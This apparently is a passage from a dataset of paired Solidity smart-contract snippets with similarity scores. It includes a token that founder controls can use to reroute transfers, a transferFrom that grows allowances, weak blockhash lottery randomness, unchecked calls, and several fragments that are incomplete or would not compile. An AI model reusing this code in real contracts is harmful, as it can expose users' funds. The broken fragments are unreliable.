        address endAddr = 0x1B66B59ABBF0AEB60F30E89607B2AD00FFFFFFFF;

 

        address public founder;

        uint256 public distributed = 0;

 

        event AllocateFounderTokens(address indexed sender);

        event Transfer(address indexed _from, address indexed _to, uint256 _value);

        event Approval(address indexed _owner, address indexed _spender, uint256 _value);

        event Tradein(address indexed _from, address indexed _to, uint256 _value);

        event Transgap(address indexed _from, address indexed _to, uint256 _value);

        function BKToken() {

            founder = msg.sender;

            baseStartTime = now;

            distribute(0x0,DistType.Miner);

            distribute(0x2Ad35dC7c9952C4A4a6Fe6f135ED07E73849E70F,DistType.Team);

            distribute(0x155A1B34B021F16adA54a2F1eE35b9deB77fDac8,DistType.Private_Placement);

            distribute(0xB7e3dB36FF7B82101bBB16aE86C9B5132311150e,DistType.Foundation);

        }

 

        function setStartTime(uint _startTime) {

            if (msg.sender!=founder) revert();

            baseStartTime = _startTime;

        }

        

        function setOffsetAddr(address _startAddr, address _endAddr) {

            if (msg.sender!=founder) revert();

            startAddr = _startAddr;

            endAddr = _endAddr;

        }

 

        function distribute(address _to, DistType _type) {

            if (msg.sender!=founder) revert();

            uint256 _percent;

            if(_type==DistType.Miner)

                _percent = 980;

            if(_type==DistType.Team)

                _percent = 4;

            if(_type==DistType.Private_Placement)

                _percent = 1;

            if(_type==DistType.Foundation)

                _percent = 15;

            uint256 _amount = _percent * _totalSupply / 1000;

            if (distributed + _amount > _totalSupply) revert();

            distType[_to] = _type;

            distributed += _amount;

            balances[_to] += _amount;

            distBalances[_to] += _amount;

            Transfer(0,_to,_amount);

        }

        

        function dealorder(address _to, uint256 gapvalue){

            if (msg.sender!=trader) revert();

            _transfer(0x0,_to,gapvalue);

            Transgap(0x0,_to,gapvalue);

        }

 

    function _transfer(address _from, address _to, uint256 _value) internal

    {

        if (_to == 0x0) throw;

        if (_value <= 0) throw; 

        if (balances[_from] < _value) throw;

        if (balances[_to] + _value < balances[_to]) throw;

        balances[_from] = SafeMath.safeSub(balances[_from], _value);

        balances[_to] = SafeMath.safeAdd(balances[_to], _value);

        Transfer(_from, _to, _value);

    }

 

        function transfer(address _to, uint256 _value) returns (bool success) {

            if (now < baseStartTime) revert();

            if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

                uint _freeAmount = freeAmount(msg.sender);

                if (_freeAmount < _value) {

                    revert();

                    return false;

                } 

                balances[msg.sender] = SafeMath.safeSub(balances[msg.sender], _value);

                if(_to >= startAddr && _to <= endAddr){

                balances[trader] = SafeMath.safeAdd(balances[trader], _value);  

                Tradein(msg.sender, _to, _value);

                Transfer(msg.sender, trader, _value);

                }

                else{

                balances[_to] = SafeMath.safeAdd(balances[_to], _value);  

                Transfer(msg.sender, _to, _value);

                }

                

                return true;

            } else {

                revert();

                return false;

            }

        }

 

        function freeAmount(address user) view returns (uint256 amount)  {

            if (user == founder) {

                return balances[user];

            }

 

            if (now < baseStartTime) {

                return 0;

            }

            

            if(distType[user] == DistType.Miner){

                return balances[user];

            }

            

            uint monthDiff = uint((now - baseStartTime) / (30 days));

            uint yearDiff =  uint((now - baseStartTime) / (360 days));

            if (monthDiff >= 36) {

                return balances[user];

            }

            

            uint unrestricted;

            

            if(distType[user] == DistType.Team){

                if(monthDiff < 36)

                unrestricted  = (distBalances[user] / 36) * monthDiff;

                else

                unrestricted = distBalances[user];

            }

            

            if(distType[user] == DistType.Private_Placement){

                if(monthDiff < 12)

                unrestricted  = (distBalances[user] / 12) * monthDiff;

                else

                unrestricted = distBalances[user];

            }

            

            if(distType[user] == DistType.Foundation){

                if(monthDiff < 12)

                unrestricted  = (distBalances[user] / 3) + (distBalances[user] / 18)*(monthDiff);

                else

                unrestricted = distBalances[user];

            }

 

            if (unrestricted > distBalances[user]) {

                unrestricted = distBalances[user];

            }

            

            if (unrestricted + balances[user] < distBalances[user]) {

                amount = 0;

            } else {

                amount = unrestricted + (balances[user] - distBalances[user]);

            }

 

            return amount;

        }

 

        function changeFounder(address newFounder) {

            if (msg.sender!=founder) revert();

            founder = newFounder;

        }

 

        function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

            if (msg.sender != founder) revert();

            if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

                uint _freeAmount = freeAmount(_from);

                if (_freeAmount < _value) {

                    revert();

                    return false;

                } 

                balances[_to] = SafeMath.safeAdd(balances[_to], _value);

                balances[_from] = SafeMath.safeSub(balances[_from], _value);   

                allowed[_from][msg.sender] = SafeMath.safeAdd(allowed[_from][msg.sender], _value);

                Transfer(_from, _to, _value);

                return true;

            } else { 

                revert();

                return false; 

            }

        }

 

        function withdrawEther(uint256 amount) {

            if(msg.sender != founder)throw;

            founder.transfer(amount);

        }

    

        function() payable {

        }

        

    }"
"contract Locations {

    function doSomething() public pure returns (uint[] memory) {

    uint[] memory localMemoryArray1 = new uint[](3);
    localMemoryArray1[0] = 4;
    localMemoryArray1[1] = 5;
    localMemoryArray1[2] = 6;

    uint[] memory localMemoryArray2 = localMemoryArray1;
    delete localMemoryArray1; 
    return localMemoryArray2;
  }
}",0.5138154142378109,"contract BaccaratShuffle is Shuffle {

 function sendPork(uint random)

  public pure returns(uint[],uint[]) 

  {

   uint[] memory banker=new uint[](3);

   uint[] memory plaryer=new uint[](3);

   uint[] memory pork=shuffle(random);

   uint j=0;

   for(uint k=0;k<banker.length;k++)

   {

       banker[k]=pork[j];

       j++;

       plaryer[k]=pork[j];

       j++;

   }

   

   return(banker,plaryer);

   }

}"
"contract SendAndTransferExample {

    function SimpleSendToAccount() public returns(bool) {
       return msg.sender.send(10000000000000000000);
    }

    function SimpleTransferToAccount() public {
       msg.sender.transfer(10000000000000000000);
    }
}",0.5101845721849536,"contract TokenController {

        function onTransfer(address _from, address _to, uint _amount) public returns(bool);

        function onApprove(address _owner, address _spender, uint _amount) public returns(bool);
    }"
"contract RecurringLottery {
         struct Round {
            uint deployBlock;
            uint endBlock;
            uint drawBlock;
            Entry[] entries;
            uint totalQuantity;
            address winner;
       }
struct Entry {
    address buyer;
    uint quantity;
}

uint constant public TICKET_PRICE = 1e15;

mapping(uint => Round) public rounds;
uint public round;
uint public duration;
mapping (address => uint) public balances;


function RecurringLottery (uint _duration) public {
    round = 1;
    duration = _duration;
    rounds[round].deployBlock = block.number;
    rounds[round].endBlock = block.number + duration;
    rounds[round].drawBlock = block.number + duration + 5;
}

function buy () payable public {
    require(msg.value % TICKET_PRICE == 0);

    if (block.number > rounds[round].endBlock) {
        round += 1;
        rounds[round].deployBlock = block.number;
        rounds[round].endBlock = block.number + duration;
        rounds[round].drawBlock = block.number + duration + 5;
    }

    uint quantity = msg.value / TICKET_PRICE;
    Entry memory entry = Entry(msg.sender, quantity);
    rounds[round].entries.push(entry);
    rounds[round].totalQuantity += quantity;
}

function drawWinner (uint roundNumber) public {
    Round storage drawing = rounds[roundNumber];
    require(drawing.winner ==  address(0));
    require(block.number > drawing.drawBlock);
    require(drawing.entries.length > 0);

    
    bytes32 rand = keccak256(
        block.blockhash(drawing.drawBlock)
    );
    uint counter = uint(rand) % drawing.totalQuantity;
    for (uint i=0; i < drawing.entries.length; i++) {
        uint quantity = drawing.entries[i].quantity;
        if (quantity > counter) {
            drawing.winner = drawing.entries[i].buyer;
            break;
        }
        else
            counter -= quantity;
    }

    balances[drawing.winner] += TICKET_PRICE * drawing.totalQuantity;
}

function withdraw () public {
    uint amount = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(amount);
}

function deleteRound (uint _round) public {
    require(block.number > rounds[_round].drawBlock + 100);
    require(rounds[_round].winner != address(0));
    delete rounds[_round];
}

function () payable public {
    buy();
}",0.5724509924897097,"contract DonutChain is ERC20 {

    

  event TokensBurned(address indexed burner, uint256 value);

  event Mint(address indexed to, uint256 amount);

  event MintFinished();

  uint8  public constant decimals = 0;

  string public constant name = ""donutchain.io token #1"";

  string public constant symbol = ""DNT1"";

  bool public flag = true;

  uint256 public endBlock;

  uint256 public mainGift;

  uint256 public amount = 0.001 ether;

  uint256 public increment = 0.000001 ether;

  address public donee;



  constructor() public {

    endBlock = block.number + 24 * 60 * 4;

  }

  function() external payable {

    require(flag);

    flag = false;

    if (endBlock > block.number) {

      require(msg.value >= amount);

      uint256 tokenAmount =  msg.value / amount;

      uint256 change = msg.value - tokenAmount * amount;

        if (change > 0 )

          msg.sender.transfer(change);

        if (msg.data.length == 20) {

          address refAddress = bToAddress(bytes(msg.data));

          refAddress.transfer(msg.value / 10); 

        } 

          mainGift += msg.value / 5; 

          donee = msg.sender;

          endBlock = block.number + 24 * 60 * 4; 

          amount += increment * tokenAmount;

          _mint(msg.sender, tokenAmount);

          emit Mint(msg.sender, tokenAmount);

          flag = true;

        } else {

          msg.sender.transfer(msg.value);

          emit MintFinished();

          selfdestruct(donee);

        }

  }

  



  function etherPerToken() public view returns (uint256) {

    uint256 sideETH = address(this).balance - mainGift;

    if (totalSupply() == 0)

        return 0;

    return sideETH / totalSupply();

  }



  

  function giftAmount(address _who) external view returns (uint256) {

    return etherPerToken() * balanceOf(_who);

  }

  

  

  function transferGift(uint256 _amount) external {

    require(balanceOf(msg.sender) >= _amount);

    uint256 ept = etherPerToken();

    _burn(msg.sender, _amount);

    emit TokensBurned(msg.sender, _amount);

    msg.sender.transfer(_amount * ept);

  }



  function bToAddress(

    bytes _bytesData

  )

    internal

    pure

    returns(address _refAddress) 

  {

    assembly {

      _refAddress := mload(add(_bytesData,0x14))

    }

    return _refAddress;

  }



}"
"contract MarketMaker {
address iplogic;
address ipxaddr;
function MarketMaker(address _iplogic, address _ipx) {
    iplogic = _iplogic;
    ipxaddr = _ipx;
    log(ipxaddr);
    log(_ipx);
}
event log(address ipx);
function createNewMarket(string prop, uint256 minBet, bool initUtility) onlyIplogic returns (address, address) {
    log(ipxaddr);
    log(iplogic);}",0.5697435851830479,"contract AirDrop is Ownable {

  
  Token public tokenInstance;

  
  function AirDrop(address _tokenAddress){
    tokenInstance = Token(_tokenAddress);
  }

  
  function doAirDrop(address[] _address, uint256 _amount) onlyOwner public returns (bool) {
    uint256 count = _address.length;
    for (uint256 i = 0; i < count; i++)
    {
      
      tokenInstance.transfer(_address [i],_amount);
    }
  }
}"
"contract Contract {

struct A {
  int a;
}

struct B {
  A[] as;
}

mapping(address => B[]) bs;

function addB(B memory b) {
  bs[msg.sender].push(...???...);
}

}",0.5567183686048595,"contract EOSContractInterface

{

    mapping (address => string) public keys;

    function balanceOf( address who ) constant returns (uint value);

}"
"contract C {
  function Get() constant returns(bytes8[]) {
    bytes8[] stuff;
    return stuff;
  }
  function Copy() {
    bytes8[] memory stuff = Get();
  }
}",0.5892891672840204,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract Election {
    
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }

    
    
    mapping(uint => Candidate) public candidates;
    
    uint public candidatesCount;

    function Elections () public {
        addCandidate(""Candidate 1"");
        addCandidate(""Candidate 2"");
    }

    function addCandidate (string memory _name) private {
        candidatesCount ++;
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
    }

}",0.5530519173329296,"contract owned {
    address public owner;
    address public candidate;

    function owned() payable internal {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function changeOwner(address _owner) onlyOwner public {
        candidate = _owner;
    }

    function confirmOwner() public {
        require(candidate != address(0));
        require(candidate == msg.sender);
        owner = candidate;
        delete candidate;
    }
}"
"contract SortStruct {


    struct TestStruct {
        address user;
        uint256 value;
    }
    TestStruct[] public testStructArray;
    TestStruct[] public sortedArray;

    function add(uint256 _value) public {


        TestStruct memory test;

        test.value = _value;
        testStructArray.push(test);

    }


    function sort() public {
        sortedArray = sort(testStructArray);
    }


    
    
    
    function sort(TestStruct[] memory  data) internal returns (TestStruct[] memory) {
       quickSort(data, int(0), int(data.length - 1));
       return data;
    }

    function quickSort(TestStruct[] memory arr, int left, int right) internal {
        int i = left;
        int j = right;
        if(i==j) return;
        uint pivot = arr[uint(left + (right - left) / 2)].value;
        while (i <= j) {
            while (arr[uint(i)].value < pivot) i++;
            while (pivot < arr[uint(j)].value) j--;
            if (i <= j) {

                
                TestStruct memory tempSortCandidate;
                tempSortCandidate = arr[uint(i)];
                arr[uint(i)] = arr[uint(j)];
                arr[uint(j)] = tempSortCandidate;

                i++;
                j--;
            }
        }
        if (left < j)
            quickSort(arr, left, j);
        if (i < right)
            quickSort(arr, i, right);
    }

}",0.5284275859474902,"contract ERC223 {
    function balanceOf(address who) public view returns (uint);

    function name() public view returns (string _name);
    function symbol() public view returns (string _symbol);
    function decimals() public view returns (uint8 _decimals);
    function totalSupply() public view returns (uint256 _supply);

    function transfer(address to, uint value) public returns (bool ok);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok);

    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed burner, uint256 value);
}"
"contract PublishService {

    using strings for *;
    using SafeMath for uint;
    struct ServiceListStruct {
        string cloudID;
        address gatewayID;
        string serviceProducerID;
        mapping (string => string) serviceProducerMetadata;
        string serviceConsumerMetaAttr;
        string accessControlModel;
    }

    ServiceListStruct[] public BCServiceList;

    uint BCServiceListIndex;

    function PublishService() {
        BCServiceListIndex = 0;
    }

    modifier onlyServiceProducerOwner(address _gatewayID) {
        require(msg.sender == _gatewayID);
        _;
    }

    ServiceListStruct sls;
    uint public maxParams = 0;


    function addEntry(string _cloudID, address _gatewayID, string _serviceProducerID, string _serviceProducerMetadata, string _serviceConsumerMetaAttr, string _accessControlModel) public onlyServiceProducerOwner(_gatewayID) returns (uint) {
        sls.cloudID = _cloudID;
        sls.gatewayID = _gatewayID;
        sls.serviceProducerID = _serviceProducerID;
        sls.serviceConsumerMetaAttr = _serviceConsumerMetaAttr;
        sls.accessControlModel = _accessControlModel;
        BCServiceList.push(sls);
        
        string memory s1;
        string memory s2 = _serviceProducerMetadata;
        string memory s3;
        bytes memory s2bytes = bytes(_serviceProducerMetadata);
        uint paramCount = 0;
        while(s2bytes.length != 0) {
            (s1,s2) = splitString(s2,"";"");
            (s1,s3) = splitString(s1,"":"");
            BCServiceList[BCServiceListIndex].serviceProducerMetadata[s1] = s3;
            paramCount = paramCount.add(1);
            s2bytes = bytes(s2);
        }
        if(maxParams < paramCount) {
            maxParams = paramCount;
        }
        BCServiceListIndex = BCServiceListIndex.add(1);
        return 1;
    }

    function deleteEntry(string _cloudID, address _gatewayID, string _serviceProducerID) public onlyServiceProducerOwner(_gatewayID) returns (uint) {
        require(msg.sender == _gatewayID);
        int pos = -1;
        for(uint index = 0; index < BCServiceList.length; index++) {
            if(compareStringsbyBytes(_cloudID, BCServiceList[index].cloudID)) {
                if(_gatewayID == BCServiceList[index].gatewayID) {
                    if(compareStringsbyBytes(_serviceProducerID, BCServiceList[index].serviceProducerID)) {
                        pos = int(index);
                    }
                }
            }
        }
        if(pos > -1) {
             BCServiceList[index] = BCServiceList[BCServiceList.length -1];
             delete BCServiceList[BCServiceList.length - 1];
             BCServiceList.length--;
             return 1;
        }
        else
            return 0;
    }

    function compareStringsbyBytes(string s1, string s2) internal pure returns(bool) {
        bytes memory s1bytes = bytes(s1);
        bytes memory s2bytes = bytes(s2);
        if(s1bytes.length!=s2bytes.length) {
            return false;
        }
        else {
            for(uint i = 0; i < s1bytes.length; i++) {
                if(s1bytes[i] != s2bytes[i])
                return false;
            }
            return true;
        }
    }

    function splitString(string _s, string _seperator) internal returns(string, string) {
        var s_slice = _s.toSlice();
        var seperator_slice = _seperator.toSlice();
        string memory result = """";
        var result_slice = result.toSlice();
        result_slice = s_slice.split(seperator_slice);
        return (result_slice.toString(), s_slice.toString());
    }
}",0.5287354955394594,"contract PubKeyTrust {
	address public owner;

	
	string[] public hashTypes;

	
	struct MerkleInfo {
		bytes merkleTreeRoot;
		uint blockNumber;
	}
	MerkleInfo[] public merkleTreeRoots;

	
	mapping(bytes20 => mapping(uint8 => uint)) public users;

	event HashTypeAdded(uint8 hashTypeID);
	event MerkleTreeRootAdded(uint8 hashTypeID, bytes merkleTreeRoot);

	function PubKeyTrust() public {
		owner = msg.sender;
		merkleTreeRoots.push(MerkleInfo(new bytes(0), block.number));
	}

	modifier onlyByOwner()
	{
		if (msg.sender != owner)
			require(false);
		else
			_;
	}

	function numHashTypes() public view returns (uint) {

		return hashTypes.length;
	}

	function addHashType(string description) public onlyByOwner returns(bool, uint8) {

		uint hashTypeID = hashTypes.length;

		
		
		
		
		if (hashTypeID >= 256) require(false);
		if (bytes(description).length == 0) require(false);
		if (bytes(description).length > 64) require(false);

		
		for (uint i = 0; i < hashTypeID; i++)
		{
			if (stringsEqual(hashTypes[i], description)) {
				return (false, uint8(0));
			}
		}

		
		hashTypes.push(description);
		HashTypeAdded(uint8(hashTypeID));

		return (true, uint8(hashTypeID));
	}

	
	function addMerkleTreeRoot(uint8 hashTypeID, bytes merkleTreeRoot, bytes userIDsPacked) public onlyByOwner {

		if (hashTypeID >= hashTypes.length) require(false);
		if (merkleTreeRoot.length == 0) require(false);

		uint index = merkleTreeRoots.length;
		bool addedIndexForUser = false;

		uint numUserIDs = userIDsPacked.length / 20;
		for (uint i = 0; i < numUserIDs; i++)
		{
			bytes20 userID;
			assembly {
				userID := mload(add(userIDsPacked, add(32, mul(20, i))))
			}

			uint existingIndex = users[userID][hashTypeID];
			if (existingIndex == 0)
			{
				users[userID][hashTypeID] = index;
				addedIndexForUser = true;
			}
		}

		if (addedIndexForUser)
		{
			merkleTreeRoots.push(MerkleInfo(merkleTreeRoot, block.number));
			MerkleTreeRootAdded(hashTypeID, merkleTreeRoot);
		}
	}

	function getMerkleTreeRoot(bytes20 userID, uint8 hashTypeID) public view returns (bytes) {

		uint merkleTreeRootsIndex = users[userID][hashTypeID];
		if (merkleTreeRootsIndex == 0) {
			return new bytes(0);
		}
		else {
			MerkleInfo storage merkleInfo = merkleTreeRoots[merkleTreeRootsIndex];
			return merkleInfo.merkleTreeRoot;
		}
	}

	function getBlockNumber(bytes20 userID, uint8 hashTypeID) public view returns (uint) {

		uint merkleTreeRootsIndex = users[userID][hashTypeID];
		if (merkleTreeRootsIndex == 0) {
			return 0;
		}
		else {
			MerkleInfo storage merkleInfo = merkleTreeRoots[merkleTreeRootsIndex];
			return merkleInfo.blockNumber;
		}
	}

	
	function stringsEqual(string storage _a, string memory _b) internal view returns (bool) {

		bytes storage a = bytes(_a);
		bytes memory b = bytes(_b);
		if (a.length != b.length) {
			return false;
		}
		for (uint i = 0; i < a.length; i++) {
			if (a[i] != b[i]) {
				return false;
			}
		}
		return true;
	}
}"
"contract Allowed {
    Allower allower;

    function doSthOnAllower() {
        allower.doSth();
    }
}",0.5196114798808422,"contract Base {
    modifier only(address allowed) {
        require(msg.sender == allowed);
        _;
    }
}"
"contract TestSafeMath{ 
    function test_add_10_and_max_should_return_err() {
          uint256 max = 2**256 - 1;
          uint256 expected = ""revert overflow error"";
          Assert.errorsEqual(SafeMathExt.add(10, max), expected, ""Addition of 10 and max should revert"");
    }
}",0.5117024460623948,"contract SmithConnect {

      mapping (uint256 => uint256) public averageQuality;

    function ownerOf(uint256 _tokenId) external view returns (address owner);
    function balanceOf(address _owner) public view returns (uint256 balance);
    
    
}"
"contract Test{
  bytes4 public method;
  string public method_s;

  function Test() {
    method = this.get_f.selector;
  }

  function makeString(){
   method_s = somefunc(method);
  }

}",0.5770046091662201,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract Student{
    struct stu{
        string name;
        uint age;
        bool tookTest;
    }
    mapping(uint => stu) studentNames;
    function addStudent (uint ID, string _name, uint _age) {
        studentNames[ID] = stu(_name, _age, false);
    }
    function updateStudent (uint ID) {
        studentNames[ID].tookTest = true;
    }
}",0.5461396077811151,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract SellTokens{
    
       IUniswapV2Router02 usi = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
          
    function sellDai(uint256 daiQty , address cryptoToken) public payable returns(uint256){



    uint256 ethAmountDerivable = getEstimatedTokenForETH(daiQty , cryptoToken)[0];
 
  uint deadline = now + 300; 

    usi.swapExactTokensForETH(daiQty , ethAmountDerivable, getPathForTokenToETH(cryptoToken), address(this), deadline);

   return ethAmountDerivable;

}
    
    function getEstimatedTokenForETH(uint daiQty , address crypto) public view returns (uint[] memory) {
        return usi.getAmountsIn(daiQty, getPathForTokenToETH(crypto));
      }
    
     function getPathForTokenToETH(address crypto) private view returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = crypto;
        path[1] = usi.WETH();
        
        return path;
      }
    
    }",0.5512309770214701,"contract PostDeliveryCrowdsale is TimedCrowdsale {

    using SafeMath for uint256;



    

    mapping(address => uint256) private _balances;



    

    address[] private _backers;



    

    function withdrawTokens(address beneficiary) public {

        require(goalReached());

        uint256 amount = _balances[beneficiary];

        require(amount > 0);

        _balances[beneficiary] = 0;

        _deliverTokens(beneficiary, amount);

    }



    

    function balanceOf(address account) public view returns (uint256) {

        return _balances[account];

    }



    function backers() public view returns (address[] memory) {

        return _backers;

    }



    

    function _processPurchase(address beneficiary, uint256 tokenAmount) internal {

        if (!goalReached()) {

            _balances[beneficiary] = _balances[beneficiary].add(tokenAmount);

            _backers.push(beneficiary);

            _addSold(tokenAmount);

            return;

        }

        super._processPurchase(beneficiary, tokenAmount);

    }

}"
"contract BankA{
  function creation() public returns(string memory){
    customer client=new customer();
    client.prime(""Alireza Kiakojouri"",""5000077563"", true, 2, here);
    return uint2str(uint(client.Array()));
  }
  function uint2str(uint _i) internal pure returns (string memory ) {
    if (_i == 0) {
        return ""0"";
    }
    uint j = _i;
    uint len;
    while (j != 0) {
        len++;
        j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (_i != 0) {
        bstr[k--] = byte(uint8(48 + _i % 10));
        _i /= 10;
    }
    return string(bstr);
  }
  function() external payable{}
  }",0.5914089905589289,"contract OpenSeaENSResolver is Ownable {

  string private _baseURI = ""https:



  function baseURI() public view returns (string memory) {

    return _baseURI;

  }



  function setBaseURI(string memory uri) public onlyOwner {

    _baseURI = uri;

  }



  function openSeaVersion() public pure returns (string memory) {

    return ""1.0.0"";

  }



  function text(bytes32 node, string memory key) public view returns (string memory) {

    if (keccak256(bytes(key)) == keccak256(bytes(""url""))) {

      return Strings.strConcat(_baseURI, Strings.uint2str(uint256(node)));

    }

    return """";

  }

}"
"contract caseEvidence{
    uint CODE_SUCCESS = 0;
    uint FILE_NOT_EXIST = 3002;
    uint FILE_ALREADY_EXIST  = 3003;
    uint USER_NOT_EXIST = 3004;

mapping(uint => address) caseEvidenceMap;
event SaveEvi(address _oper,uint _time,uint _caseId);
event GetEvi(address _oper,uint _time,uint _caseId);

function saveEvidence(uint caseId,bytes fileHash,uint fileUploadTime) public returns(uint code,address addr){
    address fileEviAddr = caseEvidenceMap[caseId];
    if (fileEviAddr == 0) {
      fileEviAddr = new fileEvidence(); 
      caseEvidenceMap[caseId] = fileEviAddr;
    } 
    fileEvidence fileEvi = fileEvidence(fileEviAddr);
    fileEvi.saveFileEvi(fileHash,fileUploadTime);
    emit SaveEvi(fileEviAddr,fileUploadTime,caseId);
    return (0,fileEviAddr);
}

function getEviAddr(uint caseId) public view returns(address addr){
    return caseEvidenceMap[caseId];
}
function getEvidence(uint caseId,bytes fileHash) public view returns(uint _code,bytes memory _hash,uint _upTime,address _upOperator) {
    address fileEviAddr = caseEvidenceMap[caseId];
    fileEvidence fileEvi = fileEvidence(fileEviAddr);
    (_upTime,_upOperator) = fileEvi.getFileEvi(fileHash);

    if(_upTime == 0){
        return (FILE_NOT_EXIST,"""",0,msg.sender);
    }
    return (CODE_SUCCESS,fileHash,_upTime,_upOperator);
}

}",0.5001928327399828,"contract BaseAirdrop is Lockable {

    using SafeMath for uint;



    ERC20Token public token;



    address public tokenHolder;



    mapping(address => bool) public users;



    event AirdropToken(address indexed to, uint amount);



    constructor(address _token, address _tokenHolder) public {

        require(_token != address(0) && _tokenHolder != address(0));

        token = ERC20Token(_token);

        tokenHolder = _tokenHolder;

    }



    function airdrop(uint8 v, bytes32 r, bytes32 s, uint amount) public whenNotLocked {

        if (users[msg.sender] || ecrecover(prefixedHash(amount), v, r, s) != owner) {

            revert();

        }

        users[msg.sender] = true;

        token.transferFrom(tokenHolder, msg.sender, amount);

        emit AirdropToken(msg.sender, amount);

    }



    function getAirdropStatus(address user) public constant returns (bool success) {

        return users[user];

    }



    function originalHash(uint amount) internal view returns (bytes32) {

        return keccak256(abi.encodePacked(

                ""Signed for Airdrop"",

                address(this),

                address(token),

                msg.sender,

                amount

            ));

    }



    function prefixedHash(uint amount) internal view returns (bytes32) {

        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

        return keccak256(abi.encodePacked(prefix, originalHash(amount)));

    }

}"
"contract Contract{
    event LOG_Increase();
    uint sum = 0;

    function Increase() public {
        sum++;
        emit LOG_Increase();
    }    
}",0.5669209246288983,"contract ContractReceiver {

    function tokenFallback(address _from, uint _value, bytes _data) public pure;

}"
"contract Blackjack is usingOraclize{

   uint public random;

   event Paid(address indexed _from, uint _value);

   function() external payable {
       Paid(msg.sender, msg.value);
   }

   function Blackjack() public {
       OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);
   }

   function getRandom() public constant {
       oraclize_newRandomDSQuery(0, 4, 200000);
   }

   function __callback(bytes32 _queryId, string _result, bytes _proof) public{
        random = uint(keccak256(_result)) % 52 + 1;
   }
}",0.5724541012588392,"contract Participant {

    address constant smartolution = 0xe0ae35fe7Df8b86eF08557b535B89bB6cb036C23;



    address public owner;

    uint public daily;

    uint public index;

    

    constructor(address _owner, uint _daily) public {

        owner = _owner;

        daily = _daily;

        index = 0;

    }

    

    function () external payable {}

    

    function process() external payable returns (bool) {

        require(msg.value == daily, ""Invalid value"");

        

        smartolution.call.value(msg.value)();

        owner.send(address(this).balance);

        

        return ++index == 45;

    }

}"
"contract RegisterContract{

event setNewUser(bytes32 name,address etherAddr, address contractAddr,uint now);
address owner;
struct User{
    bytes32 name;
    address etherAddr;
    address contractAddr;
}
User[] private users;

constructor() public{
    owner = msg.sender;
}
modifier checkOwner(){
    require(msg.sender == owner);
    _;
}
function getOwner() public view returns (address){
    return owner;
}

function registerUser(bytes32 name,address etherAddr, address contractAddr) public checkOwner{
    User memory newUser;
    newUser.name = name;
    newUser.etherAddr = etherAddr;
    newUser.contractAddr = contractAddr;
    users.push(newUser);
    emit setNewUser(name,etherAddr,contractAddr,now);
}

function setAddress(bytes32 name,address etherAddr, address contractAddr) public checkOwner{
    for(uint8 i=0;i<users.length;i++){
        if(users[i].name==name){
            users[i].etherAddr=etherAddr;
            users[i].contractAddr=contractAddr;
        }
    }
}

function getUsers() public checkOwner view returns (bytes32[],address[],address[]) {
    bytes32[] memory names= new bytes32[](users.length);
    address[] memory etherAddr = new address[](users.length);
    address[] memory contractAddr = new address[](users.length);
    for(uint8 i=0;i<users.length;i++){
        names[i]= users[i].name;
        etherAddr[i] = users[i].etherAddr;
        contractAddr[i] = users[i].contractAddr;
    }
    return (names,etherAddr,contractAddr);
}

function getContractAddress(address etherAddr) public checkOwner view returns (bytes32,address) {
    for(uint8 i=0;i<users.length;i++){
        if(users[i].etherAddr==etherAddr){
            return (users[i].name,users[i].contractAddr);
        }
    }
}
}",0.568888329859312,"contract BatchTransfer is Ownable {
    using SafeMath for uint256;
    event TransferToken(address indexed from, address indexed to, uint256 value);
    Token public standardToken;
    
    mapping (address => bool) public contractAdmins;
    mapping (address => bool) public userTransfered;
    uint256 public totalUserTransfered;

    function BatchTransfer(address _owner) public {
        require(_owner != address(0));
        owner = _owner;
        owner = msg.sender; 
    }

    function setContractToken (address _addressContract) public onlyOwner {
        require(_addressContract != address(0));
        standardToken = Token(_addressContract);
        totalUserTransfered = 0;
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return standardToken.balanceOf(_owner);
    }

    modifier onlyOwnerOrAdmin() {
        require(msg.sender == owner || contractAdmins[msg.sender]);
        _;
    }

    
    function setContractAdmin(address _admin, bool _isAdmin) public onlyOwner {
        contractAdmins[_admin] = _isAdmin;
    }

    
    function batchTransfer(address[] _recipients, uint256[] _values) external onlyOwnerOrAdmin returns (bool) {
        require( _recipients.length > 0 && _recipients.length == _values.length);
        uint256 total = 0;
        for(uint i = 0; i < _values.length; i++){
            total = total.add(_values[i]);
        }
        require(total <= standardToken.balanceOf(msg.sender));
        for(uint j = 0; j < _recipients.length; j++){
            standardToken.transfer(_recipients[j], _values[j]);
            totalUserTransfered = totalUserTransfered.add(1);
            userTransfered[_recipients[j]] = true;
            TransferToken(msg.sender, _recipients[j], _values[j]);
        }
        return true;
    }
}"
"contract Caller{

    Callee callee;
    uint public anyNumber;

    function Caller(address calleeAddr) public {
        callee = Callee(calleeAddr);
    }

    function usingCallee(uint callerData) external {
        callee.theOnlyFunctionCallerNeeds(callerData);
    }
}",0.5816527780665852,"contract Callable is Owned {

    
    mapping(address => bool) public callers;

    
    modifier onlyCaller {
        require(callers[msg.sender]);
        _;
    }

    
    function updateCaller(address _caller, bool allowed) public onlyOwner {
        callers[_caller] = allowed;
    }
}"
"contract InsuranceClaimFactory{
    address public claimer;
